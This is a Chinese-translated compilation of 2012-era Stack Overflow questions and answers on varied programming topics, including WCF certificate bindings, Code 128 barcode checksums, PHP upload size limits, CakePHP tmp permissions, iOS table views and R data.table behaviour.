## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T21:17:48.050

[按照此处](http://webservices20.blogspot.co.il/2012/06/12-common-wcf-interop-confusions.html)的说明，使用带有“mutualCertificate”的 security.mode 的 customBinding 。如果失败，请发布您的请求看起来如何（通过 Fiddler 或 Wcf 日志记录），以便我们进行比较。一个预期的区别是证书将显示为二进制令牌而不是 X509Data。我不希望服务器因此而失败。如果确实如此，您可以通过从代码创建整个自定义绑定来解决此问题。当您需要创建安全元素时，它将是这样的：

```
SecurityBindingElement sec =
                SecurityBindingElement.CreateMutualCertificateBindingElement(
                  MessageSecurityVersion.WSSecurity10WSTrustFebruary2005WSSecureConversationFebruary2005WSSecurityPolicy11BasicSecurityProfile10, false);
X509SecurityTokenParameters x509Params = new X509SecurityTokenParameters();
x509Params.X509ReferenceStyle = X509KeyIdentifierClauseType.IssuerSerial;
((AsymmetricSecurityBindingElement) sec).InitiatorTokenParameters = x509Params; 
```

或通过在自定义编码器中对 X509Data 进行硬编码。

# c# - 使用条形码字体打印

> ID：13076461
> 
> 赞同：2
> 
> 时间：2012-10-25T20:10:22.953
> 
> 标签：c#, text, ms-office, barcode

我需要在商店里扔一些条形码，供员工用来扫描相应的回复。

我有一个可以为我们的标签创建字体的 C# 应用程序，但在这里我只想在 Microsoft Word 中选择我的**Code 128**字体并将其打印出来。

[Wiki](http://en.wikipedia.org/wiki/Code_128)显示除了常规文本之外，我还需要一个开始/停止字符和一个检查字符。这意味着选择文本`SCAN_YES`并将字体从**Times New Roman**更改为**Code 128**不会剪切它。我试过了，但条形码阅读器无法读取它。

![条码128](../Images/c198af3fd1a5364796d267ae58f27e97.png)

我正在尝试按照 wiki 文档进行操作，但我就是不明白。

对于**Weight 1**，wiki 显示**Start Code A**的值为 103，但我的 ASCII 图表显示 103 是 letter `g`。

然后，wiki 显示**Sum**、**Divisor**、**Sum/Divisor**和**Remainder & Check Sum Value**。现在我真的迷路了。这些是干什么用的？

有没有一个地方有**Code128 For Dummies**或者有人可以向这个 Dummy 解释它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T13:02:01.220

如果你想坚持人类可读的字符，你应该使用 Code 128 'B'。

这就是我在代码“B”中得到的： ![在此处输入图像描述](../Images/b5b75d45eba4e311c0b50e6637accbfd.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:44:27.060

好的，我将开始`SCAN_YES`并展示我将如何转换它。你们投入并告诉我我做错了什么。

我将使用 Start Set A。（好/坏？）

```
 Weighted
Character    Value    Value    Total
Start Set A   103   103         103
S             83    83*1         83
C             67    67*2        134
A             65    65*3        195
N             78    78*4        312
_             95    95*5        475
Y             89    89*6        534
E             69    69*7        483
S             83    83*8        664
                    Total      2983 
```

模数是 99，因为`2983 / 103 = 28 R 99`.

所以，我编码的 Code128 A 条码应该是：

```
103(Code A=g)+83(S)+67(C)+65(A)+78(N)+95(_)+89(Y)+69(E)+83(S)+99(c)+106(stop=j) 
```

那么，我会将我的 MS Word 文档中的文本更改为`gSCAN_YEScj`，然后选择我的 Code128 条形码字体吗？

显然，这是不对的，因为输入条形码字体的文本不会用我的条形码阅读器扫描。

如果模数是不可打印的数字，如 7（可听铃声）怎么办？

![ASCII 图表](../Images/7b11d9c8126343b571541601eabccf07.png)

# conditional - Poly ML 中的多个条件

> ID：13076470
> 
> 赞同：1
> 
> 时间：2012-10-25T20:10:49.407
> 
> 标签：conditional, sml, ml, polyml

例如，如果我想定义一个函数，它在 a=b 和 b=c 时返回 true，如果在 Poly ML 中这些等式都不为真，则返回 false，我将如何编写它？我不确定如何同时做多个条件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T11:18:06.913

不是吗

```
a = b andalso b = c 
```

你想要什么？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T07:34:23.653

我相信这可以满足您的需求：

```
fun f (a, b, c) = 
  if a = b andalso b = c
  then true
  else
    if a <> b andalso b <> c
    then false
    else ... (* you haven't specified this case *) 
```

这里的要点是：

*   您可以嵌套条件，即`if`在另一个表达式`then`或`else`case中包含一个表达式
*   运算符`andalso`是布尔连词，意思`x andalso y`是`true`当且仅当`x`评估为`true`和`y`评估为`true`。

您可以使用表达式更简洁地`case`表达：

```
fun f (a, b, c) =
  case (a = b, b = c) of
    (true, true) => true
  | (false, false) => false
  | _ => (* you haven't specified this case *) 
```

# php - 禁用魔术引号

> ID：13076471
> 
> 赞同：2
> 
> 时间：2012-10-25T20:10:49.363
> 
> 标签：php, wordpress

> **可能重复：**
> [如何关闭共享主机上的魔术引号？](https://stackoverflow.com/questions/517008/how-to-turn-off-magic-quotes-on-shared-hosting)

我整天都在不知所措，试图在我的 WordPress 主题中禁用魔术引号......

我已经尝试了 .htaccess 和 php.ini（以及 php5.ini）文件方法，但是 .htaccess 给了我一个 500 内部服务器错误（我的主机是 GoDaddy）并且 php.ini 方法不起作用。我还用我在网上找到的几十种不同的代码尝试了 php 方法，这就是其中之一：

```
if (get_magic_quotes_gpc()) 
{
function remove_slash(&$value)
{
$value = stripslashes($value);
}
array_walk_recursive($_GET, "remove_slash");
array_walk_recursive($_POST, "remove_slash");
array_walk_recursive($_COOKIE, "remove_slash");
array_walk_recursive($_REQUEST, "remove_slash");
} 
```

然而，没有一个人摆脱了那些烦人的反斜杠！如果这里有人设法为我解决这个问题，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:12:48.080

在我的项目中，我使用这个：

```
if (get_magic_quotes_gpc()) {
    $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
    while (list($key, $val) = each($process)) {
        foreach ($val as $k => $v) {
            unset($process[$key][$k]);
            if (is_array($v)) {
                $process[$key][stripslashes($k)] = $v;
                $process[] = &$process[$key][stripslashes($k)];
            } else {
                $process[$key][stripslashes($k)] = stripslashes($v);
            }
        }
    }
    unset($process);
} 
```

我把它放在运行时，它工作。

我也知道如何通过 .htaccess 禁用它。

```
php_flag magic_quotes_gpc off 
```

我相信这两个都有效。

# c# - 如何允许最近引发的事件取消之前的事件？

> ID：13076472
> 
> 赞同：0
> 
> 时间：2012-10-25T20:10:51.900
> 
> 标签：c#, events

每当我系统上的特定文件被修改时，我的事件就会被触发。触发事件时对文件进行的处理估计约为 10 分钟。我想知道如果在第一次修改处理完成之前再次修改文件，是否可以取消处理并重新开始处理。如果是这样，我该如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:32:46.263

在我看来，您不想取消该事件，而是要处理上一个事件。假设是这种情况，您需要让您的文件处理代码取消感知。

我建议您使用[CancellationToken 和 CancellationTokenSource](http://msdn.microsoft.com/en-us/library/dd997364.aspx)，因为它们已经在框架中可用。当您开始处理事件时，您会创建一个新的取消令牌源并将其保存在某处，并在完成后将其清除。如果您收到新事件，请检查是否有已保存的 cts，如果是，请请求取消。

我包含的链接包含一些关于如何编写处理代码的代码示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:19:17.580

如果您可以控制处理代码，则可以保留一个“当前操作”实例，处理代码将定期检查该实例。如果处理完成，则将此引用设置为 null。

引发新事件时，检查当前处理对象引用是否为空。如果是，您可以将布尔标志设置为 true。处理代码在下一次定期检查时看到并停止。

# cakephp - 网站和外壳 - 如何设置 tmp 目录权限

> ID：13076476
> 
> 赞同：0
> 
> 时间：2012-10-25T20:11:13.333
> 
> 标签：cakephp, cakephp-2.1

我有一些 Web 服务 + 一些我想用 cron 执行的 shell 脚本。问题出在 tmp 目录上。

1.  为了使 web 服务工作，我必须运行命令`sudo chown -R www-data:www-data app/tmp`（www-data 是 apache 使用的组和用户）
2.  问题是，当我与某个用户一起执行 CakeShell 时，我收到很多错误，告诉 app/tmp 目录中的某些文件不可写 - 这是因为 tmp 目录归 www-data ...
3.  我可以使用 root 用户运行这些脚本 - 然后我不会收到任何错误...
4.  当我以 root 用户运行脚本时，这些脚本不时修改 app/tmp 中的一些文件，然后我在 web 服务（网站）上遇到许多错误，即 app/tmp 中的某些文件不可写。似乎运行脚本有时会修改具有执行这些脚本的用户权限的 tmp 文件。
5.  我想从 cron 执行这些脚本。

我的问题是：

1.  什么是 app/tmp 目录（权限、用户、组等）的正确设置以及如何设置它以使 web 服务和从 shell 执行脚本工作？
2.  是否可以设置 app/tmp 目录的权限以允许所有用户和组对其进行读写？这是个好主意吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:58:33.453

如果您不使用共享网络服务器，则可以使用许可所有权：

`chmod -R 777 app/tmp`

如果您拥有服务器/VPS，这不是安全漏洞，因为更明智的用户（www-data）已经拥有访问权限。

或者

您可以使用以下命令运行 crontab “in name of”`www-data`用户`su`

# php - PHP获取实际的最大上传大小

> ID：13076480
> 
> 赞同：63
> 
> 时间：2012-10-25T20:11:26.323
> 
> 标签：php

使用时

```
ini_get("upload_max_filesize"); 
```

它实际上为您提供了 php.ini 文件中指定的字符串。

将此值用作最大上传大小的参考并不好，因为

*   可以使用所谓的[shorthandbytes](http://www.php.net/manual/en/faq.using.php#faq.using.shorthandbytes)之类`1M`的，需要大量额外的解析
*   例如，当 upload_max_filesize 为 时`0.25M`，它实际上是零，再次使值的解析变得更加困难
*   此外，如果该值包含任何空格，例如它被 php 解释为零，而它在使用时显示没有空格的值`ini_get`

那么，除了 报告的值之外，还有什么方法可以获取 PHP 实际使用的值`ini_get`，或者确定它的最佳方法是什么？

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2014-08-18T19:50:39.337

Drupal 相当优雅地实现了这一点：

```
// Returns a file size limit in bytes based on the PHP upload_max_filesize
// and post_max_size
function file_upload_max_size() {
  static $max_size = -1;

  if ($max_size < 0) {
    // Start with post_max_size.
    $post_max_size = parse_size(ini_get('post_max_size'));
    if ($post_max_size > 0) {
      $max_size = $post_max_size;
    }

    // If upload_max_size is less, then reduce. Except if upload_max_size is
    // zero, which indicates no limit.
    $upload_max = parse_size(ini_get('upload_max_filesize'));
    if ($upload_max > 0 && $upload_max < $max_size) {
      $max_size = $upload_max;
    }
  }
  return $max_size;
}

function parse_size($size) {
  $unit = preg_replace('/[^bkmgtpezy]/i', '', $size); // Remove the non-unit characters from the size.
  $size = preg_replace('/[^0-9\.]/', '', $size); // Remove the non-numeric characters from the size.
  if ($unit) {
    // Find the position of the unit in the ordered string which is the power of magnitude to multiply a kilobyte by.
    return round($size * pow(1024, stripos('bkmgtpezy', $unit[0])));
  }
  else {
    return round($size);
  }
} 
```

上述功能在 Drupal 的任何地方都可用，或者您可以根据 GPL 许可版本 2 或更高版本的条款将其复制并在您自己的项目中使用。

至于问题的第 2 部分和第 3 部分，您需要`php.ini`直接解析文件。这些本质上是配置错误，PHP 正在诉诸回退行为。看来您实际上可以`php.ini`在 PHP 中获取已加载文件的位置，尽管尝试从中读取可能无法在启用 basedir 或安全模式的情况下工作：

```
$max_size = -1;
$post_overhead = 1024; // POST data contains more than just the file upload; see comment from @jlh
$files = array_merge(array(php_ini_loaded_file()), explode(",\n", php_ini_scanned_files()));
foreach (array_filter($files) as $file) {
  $ini = parse_ini_file($file);
  $regex = '/^([0-9]+)([bkmgtpezy])$/i';
  if (!empty($ini['post_max_size']) && preg_match($regex, $ini['post_max_size'], $match)) {
    $post_max_size = round($match[1] * pow(1024, stripos('bkmgtpezy', strtolower($match[2])));
    if ($post_max_size > 0) {
      $max_size = $post_max_size - $post_overhead;
    }
  }
  if (!empty($ini['upload_max_filesize']) && preg_match($regex, $ini['upload_max_filesize'], $match)) {
    $upload_max_filesize = round($match[1] * pow(1024, stripos('bkmgtpezy', strtolower($match[2])));
    if ($upload_max_filesize > 0 && ($max_size <= 0 || $max_size > $upload_max_filesize) {
      $max_size = $upload_max_filesize;
    }
  }
}

echo $max_size; 
```

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2014-03-19T08:44:36.310

这是完整的解决方案。它处理所有陷阱，如速记字节表示法，还考虑 post_max_size：

```
/**
* This function returns the maximum files size that can be uploaded 
* in PHP
* @returns int File size in bytes
**/
function getMaximumFileUploadSize()  
{  
    return min(convertPHPSizeToBytes(ini_get('post_max_size')), convertPHPSizeToBytes(ini_get('upload_max_filesize')));  
}  

/**
* This function transforms the php.ini notation for numbers (like '2M') to an integer (2*1024*1024 in this case)
* 
* @param string $sSize
* @return integer The value in bytes
*/
function convertPHPSizeToBytes($sSize)
{
    //
    $sSuffix = strtoupper(substr($sSize, -1));
    if (!in_array($sSuffix,array('P','T','G','M','K'))){
        return (int)$sSize;  
    } 
    $iValue = substr($sSize, 0, -1);
    switch ($sSuffix) {
        case 'P':
            $iValue *= 1024;
            // Fallthrough intended
        case 'T':
            $iValue *= 1024;
            // Fallthrough intended
        case 'G':
            $iValue *= 1024;
            // Fallthrough intended
        case 'M':
            $iValue *= 1024;
            // Fallthrough intended
        case 'K':
            $iValue *= 1024;
            break;
    }
    return (int)$iValue;
} 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-10-24T15:36:01.723

这就是我使用的：

```
function asBytes($ini_v) {
   $ini_v = trim($ini_v);
   $s = [ 'g'=> 1<<30, 'm' => 1<<20, 'k' => 1<<10 ];
   return intval($ini_v) * ($s[strtolower(substr($ini_v,-1))] ?: 1);
} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-11-04T22:16:37.497

看来不可能了。

因此，我将继续使用此代码：

```
function convertBytes( $value ) {
    if ( is_numeric( $value ) ) {
        return $value;
    } else {
        $value_length = strlen($value);
        $qty = substr( $value, 0, $value_length - 1 );
        $unit = strtolower( substr( $value, $value_length - 1 ) );
        switch ( $unit ) {
            case 'k':
                $qty *= 1024;
                break;
            case 'm':
                $qty *= 1048576;
                break;
            case 'g':
                $qty *= 1073741824;
                break;
        }
        return $qty;
    }
}
$maxFileSize = convertBytes(ini_get('upload_max_filesize')); 
```

最初来自[这个](http://www.php.net/manual/de/faq.using.php#78405)有用的 php.net 评论。

**仍然愿意接受更好的答案**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T20:19:45.777

我不这么认为，至少不是你定义的方式。对于最大文件上传大小，还有很多其他因素需要考虑，最值得注意的是用户的连接速度以及 Web 服务器的超时设置以及 PHP 进程。

对您来说更有用的指标可能是确定对于给定输入您希望接收的文件类型的合理最大文件大小。决定什么对您的用例是合理的，并围绕它制定政策。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-10-14T20:36:24.420

好吧，您总是可以使用这种语法，它会从 PHP ini 文件中为您提供正确的数字：

```
$maxUpload      = (int)(ini_get('upload_max_filesize'));
$maxPost        = (int)(ini_get('post_max_size')); 
```

市场

# java - JAVA初始化AtomicIntegerArray

> ID：13076484
> 
> 赞同：0
> 
> 时间：2012-10-25T20:11:54.907
> 
> 标签：java

我想知道为什么像这样初始化 AtomicIntegerArray 不起作用：

```
AtomicIntegerArray atomarr = new AtomicIntegerArray(100); 
```

Eclipse 将该行标记为错误*标记“;”上的语法错误，预期*

根据JAVA API，其中指出：

> 公共 AtomicIntegerArray(int 长度)
> 
> 创建一个给定长度的新 AtomicIntegerArray，所有元素初始为零。
> 
> 参数：length - 数组的长度

所以它应该像我理解的那样工作。

我确实找到了解决方法：

```
AtomicInteger size = new AtomicInteger;
size.set(100);
AtomicIntegerArray atomarr = new AtomicIntegerArray(size); 
```

这是否意味着数组大小的整数也必须是 AtomicInteger？

# html - 将鼠标悬停在跨度/链接上时出现奇怪的 CSS 行为

> ID：13076491
> 
> 赞同：0
> 
> 时间：2012-10-25T20:12:21.087
> 
> 标签：html, css

我目前面临一些css代码的问题。我想要实现的是当有人将鼠标悬停在要显示`#trigger`的 div中的链接上时`#hidden`。

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style type="text/css">
        #hidden {
            display: none;
            position: absolute;
            top: 20px;
            left: 100px;
            border: 1px solid red;
        }

        #trigger {
            border: 1px solid white;
            background: red;
        }
        #trigger:hover #hidden {
            display: block !important;
        }

    </style>
</head>
<body>

<div id="hidden">
    This hidden div.
</div>

<span id="trigger">
    <a href="#">Show</a>
</span>

</body>
</html> 
```

我试图理解为什么这个代码拒绝工作。我在很多地方都使用过类似的代码，而且效果很好。这里有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:15:12.623

div`hidden`不在`trigger`div 中。

您可以让您的 CSS 代码按如下方式工作：

```
<span id="trigger">
    <a href="#">Show</a>

    <div id="hidden">
        This hidden div.
    </div>
</span> 
```

顺便说一句，考虑到绝对定位 div ( `#hidden`) 将以`poistion: relative`或`absolute`作为起点 (0, 0) 的上部元素的 x 和 y。如果没有，那么它需要身体的 x 和 y。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:16:17.940

将`#hidden`元素放在元素内`#trigger`，您的选择器将起作用。

在您的选择器`#trigger:hover` `#hidden`上试图找到`#hidden`.

# php - php中是否有任何框架来处理分页？

> ID：13076494
> 
> 赞同：-3
> 
> 时间：2012-10-25T20:12:27.243
> 
> 标签：php, facebook

> **可能重复：**
> [如何在 PHP 中实现分页？](https://stackoverflow.com/questions/267892/how-do-you-implement-pagination-in-php)

客观的 ：

*   输入：一个 JSON URL（在本例中为 facebook json）
*   输出：完整的 JSON（整齐地拼接在一起）
*   过程：它获取 json url，获取 datd，进入“下一个”“页面”，将数据获取到前一个数据......直到最后。

如果没有框架，你能帮我写代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:21:42.603

这是 SF2 FrameWork 的捆绑包 [https://github.com/KnpLabs/KnpPaginatorBundle](https://github.com/KnpLabs/KnpPaginatorBundle)

下载固件@： [http ://symfony.com/](http://symfony.com/)

# iphone - 使用 Utility 模板的 Flipview 内的 Tableview

> ID：13076495
> 
> 赞同：2
> 
> 时间：2012-10-25T20:12:33.820
> 
> 标签：iphone, ios, xcode, tableview

我是 iOS 开发的新手，所以对于提出可能愚蠢的问题，我深表歉意。

我想做的是与默认天气应用程序非常相似的东西；如果应用程序有一个信息按钮，它会翻转到另一个视图，该视图有一个表格和一个完成按钮以返回应用程序。

我正在使用“实用程序”模板，它为我完成了大部分工作:)

但是，我现在正在努力将表格视图添加到翻转视图中。我在正确的道路上吗？我目前正在使用情节提要 - 开始意识到这很可能是对 GUI 的限制（毕竟 GUI 只能走这么远）。如果是这样，这是否可能以编程方式进行，我将如何将其应用于默认的“实用程序应用程序”模板。

我正在使用 Xcode 4.2。

任何帮助，将不胜感激。提前致谢 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:31:14.263

首先，您需要将 UITableView 拖放到您`flipsideViewController`的界面构建器中。确保您喜欢视图控制器的委托和数据源。

![在此处输入图像描述](../Images/72c3e70ba718e5be70fa9c9150262854.png)

然后更改`flipsideViewController.h`为数组创建一个实例变量，该变量将存储单元格标签的文本，并使控制器符合表委托和数据源方法。

```
@interface FlipsideViewController : UIViewController <UITableViewDataSource, UITableViewDelegate>
{
    NSArray *myArrayOfItems;
} 
```

在`flipsideViewController.m`alloc/init 中并填充您的数组`viewDidLoad`

```
myArrayOfItems = [[NSArray alloc] initWithObjects:@"firstItem",@"secondItem",@"thirdItem",@"fourthItem", nil]; 
```

最后，复制并粘贴以下内容，您应该有一个工作表！

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [myArrayOfItems count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    cell.textLabel.text = [myArrayOfItems objectAtIndex:indexPath.row];

    return cell;
}
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSLog(@"Selected cell index:%i",indexPath.row);
} 
```

# ios - 如何让 card.io 扫描到期日期？(iOS 6)

> ID：13076496
> 
> 赞同：3
> 
> 时间：2012-10-25T20:12:36.227
> 
> 标签：ios, card.io

其他人告诉我，除了卡号之外，card.io SDK 还可以扫描到期日期。然而，当我将它集成到我的 iOS 6 iPad 项目中时，我只能扫描卡号。有没有人在其他实现中取得成功？（即 iOS 5、iPhone 等）

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T23:31:01.270

我在card.io工作。较新版本的 card.io SDK（3.x 及更高版本）在客户端本地执行所有卡片扫描 - 较旧版本将图像发送到我们的服务器进行扫描。我们还没有在这个新版本中添加过期扫描，但它仍然是一个更好的客户体验，因为它更快（无需等待网络延迟）和更准确（没有更多的失败读取）。

# xcode - 加载笔尖但未设置视图出口

> ID：13076505
> 
> 赞同：1
> 
> 时间：2012-10-25T20:13:01.010
> 
> 标签：xcode, view, nib

首先，我检查了其他问题，但没有一个问题能解决我的问题。

我有一个自定义 UITableViewCell，我试图在 UITableView 中加载和使用它。这在以前版本的 Xcode 下运行良好，但昨天，我终于更新到最新版本（4.51 4G1004）。完成此操作后，我现在收到错误消息

> ```
> loaded the "TemplateView" nib but the view outlet was not set. 
> ```

该视图是一个自定义类，它是 的后代`UITableViewCell`，但我也尝试创建一个新的 NIB，它是一个直接的 UITableViewCell 并得到了同样的错误。我尝试`Cleaning`了该应用程序以查看是否可以纠正它，但没有。

任何帮助都将不胜感激，因为这真的让我很烦恼，我不确定此时该转向哪个方向。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T01:03:42.147

为了纠正这个问题，我创建了一个新类并开始重新构建 UITableView 和 UITableViewCell 并且一步一步地我能够接近工作。向单元格中的一个按钮添加操作时，我收到一条错误消息，并决定撤消该部分代码。我仍然收到以下错误。

[由于未捕获的异常“NSUnknownKeyException”而终止应用程序，原因：“[setValue:forUndefinedKey:]：此类与键 addOrEditSections 的键值编码不兼容。”]

“addOrEditSections”方法完全从代码中提取出来，在我的项目中没有。这只是 XCode 的一个真正错误的版本吗？我尝试了“清理”，我重新启动了 Xcode，但我仍然收到此错误，即使代码中没有地方调用“addOrEditSections”。

# python - 寻找 assertURLEquals

> ID：13076506
> 
> 赞同：4
> 
> 时间：2012-10-25T20:13:07.610
> 
> 标签：python, unit-testing

在单元测试期间，我想将生成的 URL 与测试中定义的静态 URL 进行比较。对于这种比较，最好有一个 TestCase.assertURLEqual 或类似的东西，它可以让您比较两个字符串格式的 URL，如果所有查询和片段组件都存在且相等但不一定按顺序排列，则结果为 True。

在我自己实现这个之前，这个功能已经存在了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:33:00.313

这在标准库中用[urlparse](http://docs.python.org/library/urlparse.html)实现并不难：

```
from urlparse import urlparse, parse_qs

def urlEq(url1, url2):
      pr1 = urlparse(url1)
      pr2 = urlparse(url2)
      return (pr1.scheme == pr2.scheme and
              pr1.netloc == pr2.netloc and
              pr1.path == pr2.path and
              parse_qs(pr1.query) == parse_qs(pr2.query))

# Prints True  
print urlEq("http://foo.com/blah?bar=1&foo=2", "http://foo.com/blah?foo=2&bar=1")
# Prints False
print urlEq("http://foo.com/blah?bar=1&foo=2", "http://foo.com/blah?foo=4&bar=1") 
```

基本上，比较从 URL 解析的所有内容，但使用 parse_qs 从查询字符串中获取字典。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:33:25.663

我不知道是否有内置的东西，但您可以简单地使用`urlparse`并检查自己的查询参数，因为默认情况下会考虑顺序。

```
>>> import urlparse
>>> url1 = 'http://google.com/?a=1&b=2'
>>> url2 = 'http://google.com/?b=2&a=1'
>>> # parse url ignoring query params order
... def parse_url(url):
...   u = urlparse.urlparse(url)
...   q = u.query
...   u = urlparse.urlparse(u.geturl().replace(q, ''))
...   return (u, urlparse.parse_qs(q))
... 
>>> parse_url(url1)
(ParseResult(scheme='http', netloc='google.com', path='/', params='', query='', fragment=''), {'a': ['1'], 'b': ['2']})
>>> def assert_url_equals(url1, url2):
...   return parse_url(url1) == parse_url(url1)
...
>>> assert_url_equals(url1, url2)
True 
```

# vba - Access 2007 VBA：如何获取/更改当前记录在屏幕上的位置

> ID：13076508
> 
> 赞同：4
> 
> 时间：2012-10-25T20:13:21.807
> 
> 标签：vba, ms-access, ms-access-2007

我有一个显示 40 行的 Access 2007 表单。当我打开它时，我希望当前记录的行显示在显示的 40 行中的第 5 行位置。换句话说，当前行上面应该有 4 行，下面应该有 35 行。

*MoveUpDown*是我第一次这样做，但目前它仅在当前记录的行（由*FindFirst*移动到）最初显示在行位置 #1 到 #5 时才有效。如何找到当前行的显示位置，相对于显示的行，以及如何更改它？谢谢。

```
Private Sub OpenMyFormTo(sqlWhere As String)
    Dim rs As DAO.Recordset, frm As Form
    DoCmd.Openform "myForm", acNormal
    Set frm = Forms("myForm").Form
    Set rs = frm.RecordsetClone
    If Not (rs.BOF And rs.EOF) Then
        rs.MoveFirst
        rs.FindFirst sqlWhere
        frm.Bookmark = rs.Bookmark
        MoveUpDown frm.Recordset, 5
    End If
End Sub

Private Sub MoveUpDown(rs As DAO.Recordset, RowsToMove As Integer)
    Dim RowsActuallyMoved As Integer, i As Integer
    RowsActuallyMoved = 0
    For i = 1 To RowsToMove
        If Not rs.BOF Then
            rs.MovePrevious
            RowsActuallyMoved = RowsActuallyMoved + 1
        End If
    Next i
    For i = 1 To RowsActuallyMoved
        If Not rs.EOF Then rs.MoveNext
    Next i
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T01:39:42.120

我相信我有一个答案，尽管它对我来说似乎很笨拙。此过程找到目标行，向下滚动直到目标行不可见，向上滚动回目标行，超出目标行（偏移）额外行，然后向下滚动回目标行。结果是目标行显示为第 (Offset + 1) 个可见行。如果行数 < Offset，则显示为最后一行。

```
Private Sub DisplayWithOffset(frm As Form, sqlWhere as String, Offset As Integer)

    Dim rs As DAO.Recordset, DetailsHt As Long, RowHt As Long, i As Integer
    Dim RowsVisible As Integer, BookmarkAP As Integer, RowsMoved As Integer

    DetailsHt = frm.InsideHeight _
              - frm.Section(acHeader).Height - frm.Section(acFooter).Height
    RowHt = frm.Section(acDetail).Height
    RowsVisible = IIf(RowHt > 0, DetailsHt Mod RowHt, 0)
    Set rs = frm.Recordset

    If Not (rs.BOF And rs.EOF) Then

        rs.MoveLast
        rs.FindFirst sqlWhere

        BookmarkAP = rs.AbsolutePosition

        RowsMoved = 0
        For i = 1 To RowsVisible
            If rs.AbsolutePosition + 1 < rs.RecordCount Then
                rs.MoveNext
                RowsMoved = RowsMoved + 1
            End If
        Next i

        Do Until rs.AbsolutePosition = BookmarkAP
            rs.MovePrevious
        Loop

        RowsMoved = 0
        For i = 1 To Offset
            If rs.AbsolutePosition > 0 Then
                rs.MovePrevious
                RowsMoved = RowsMoved + 1
            End If
        Next i

        For i = 1 To RowsMoved
            rs.MoveNext
        Next i

    End If

End Sub 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:23:23.093

我不完全确定这是否就是您所需要的：
a）直接转到第 5 条记录，使用： `DoCmd.GoToRecord acDataForm, Me.Name, acGoTo, 5`
（Me.Name only if the code is in the form's own code module）
b）您可以查询当前位置奇怪的 `Me.Recordset.AbsolutePosition`
是，.AbsolutePosition 从 0 开始计数，goto 命令从 1 开始计数。

# r - 为什么在 data.table 中的 R 中运行 scale 后出现 na.omit 错误？

> ID：13076509
> 
> 赞同：4
> 
> 时间：2012-10-25T20:13:24.160
> 
> 标签：r, data.table

我之前曾问过这个问题，并认为我可能会发布一个示例来说明为什么我会看到这种效果，以防它可能会有所帮助：

```
require(data.table)
x <- data.table(a=1:10)
x[,a:=scale(a)]
#    [,1]      
# 1: -1.4863011
# 2: -1.1560120
# 3: -0.8257228
# 4: -0.4954337
# 5: -0.1651446
# 6:  0.1651446
# 7:  0.4954337
# 8:  0.8257228
# 9:  1.1560120
#10:  1.4863011
na.omit(x)
Error in `[.data.table`(object, !omit) : 
  i is invalid type (matrix). Perhaps in future a 2 column matrix could return a list     of elements of DT (in the spirit of A[B] in FAQ 2.14). Please let datatable-help know if     you'd like this, or add your comments to FR #1611. 
```

原因似乎是`scale`不返回a `vector`，`data.table`也没有抱怨。相反，这样做`x[,a:=as.vector(scale(a))]`似乎可以解决问题。我错过了文档中的某些内容吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T08:37:39.450

好问题（我稍作编辑）。它应该是一个警告，或者`data.table`可以自动将 1 列强制`matrix`为向量，因为我猜`scale`你展示的方式是一项常见的任务，并且很自然地这样做。该`na.omit`方面是揭示问题的一种方式，但可能还有其他方式，因为正如您很好地展示的那样，根本原因更进一步。

已提交错误报告，谢谢：

[Bug#2333`:=`能够创建“矩阵”列，但“矩阵”列无效](https://r-forge.r-project.org/tracker/index.php?func=detail&aid=2333&group_id=240&atid=975)

* * *

**更新**：根本原因现已在 v1.8.3 中修复。1 列矩阵被默默地视为向量。具有 2 列或更多列的矩阵会发出警告。

# visual-studio-2010 - VS 2010 - 无法添加 TODO 令牌 - 添加被禁用？

> ID：13076510
> 
> 赞同：10
> 
> 时间：2012-10-25T20:13:32.380
> 
> 标签：visual-studio-2010, token, todo

删除有效，但不会启用`Add`.

![在此处输入图像描述](../Images/fcb83e678110b9c246900104f86eb940.png)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-11-19T06:00:37.880

跟着这些步骤，

1.  关闭选项页面
2.  再次打开它并转到**环境 > 品尝列表**
3.  在您单击任何内容之前，请使用您要创建的任何新令牌名称填写**名称文本框。**
